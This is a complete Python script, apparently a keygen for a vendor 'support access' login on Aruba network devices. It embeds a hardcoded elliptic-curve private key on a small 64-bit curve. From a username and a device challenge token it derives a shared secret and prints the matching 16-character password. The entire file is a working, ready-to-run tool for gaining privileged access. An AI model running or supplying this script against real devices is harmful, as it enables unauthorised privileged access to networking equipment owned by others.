#!/usr/bin/env python3
#pip requirements: tinyec, nummaster

from tinyec import registry,ec
import binascii, hmac, hashlib, sys
from nummaster.basic import sqrtmod

if len(sys.argv) != 3:
    print("Usage: support-access.py <username> <token>")
    sys.exit()

username = sys.argv[1].strip()
inp = sys.argv[2].replace("-","")

def uncompress_key(p,a,b,x):
  y = sqrtmod(pow(x, 3, p) + a * x + b, p)
  if bool(y & 1):
    return (x, y)
  return (x, p - y)

def calc_pass(shared_secret,username):
        raw = binascii.unhexlify(shared_secret)
        key = binascii.unhexlify("00"*20)
        raw_dg = hmac.new(key, raw, hashlib.sha1).digest()

        h2 = hmac.new(raw_dg, username.encode(), hashlib.sha1)
        h2.update(b"\x01")
        hmac_out = binascii.hexlify(h2.digest())
        print("Password: {}".format(hmac_out[0:16].decode()))

basepoint = int("BB3C71C351AAE96B", 16), int("830B4345D75E9275", 16)
p = int("FE4382C5413A02FF", 16)
order = 18321631499947426219
field = ec.SubGroup(p, basepoint, order, 1)
a = int("5BA3091245C856AB", 16)
b = int("C2AB76EF7FE1D7F2", 16)
curve = ec.Curve(a, b, field)
arubaPrivKey = 2826820123527714983
arubaPubKey = arubaPrivKey * curve.g

ux = int(inp.encode(),16)
uy = uncompress_key(p, a,b,ux)[1]
user_pub = ec.Point(curve,ux,uy)
SharedKey = arubaPrivKey * user_pub
sk = hex(SharedKey.x)[2:]

if len(sk) % 2 != 0:
    sk = "0" + sk

calc_pass(sk,username)
